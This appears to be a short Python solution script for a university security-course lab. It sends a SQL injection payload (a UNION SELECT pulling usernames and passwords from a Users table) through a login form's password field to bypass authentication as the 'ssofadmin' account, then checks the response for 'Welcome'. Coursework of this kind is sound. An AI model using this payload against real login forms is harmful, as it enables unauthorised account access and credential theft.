import requests 

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

#Account by predifinition: ssofadmin
user = "ssofadmin"
password = "' Union select username, password, 1, 2, 3 from Users where username = '"+ user 

#Login into account with query
params = {'username' : user, 'password' : password }
r = session.post(Server + '/login', data=params)

#Check if login was successful
assert "Welcome" in r.text
print("Login successful")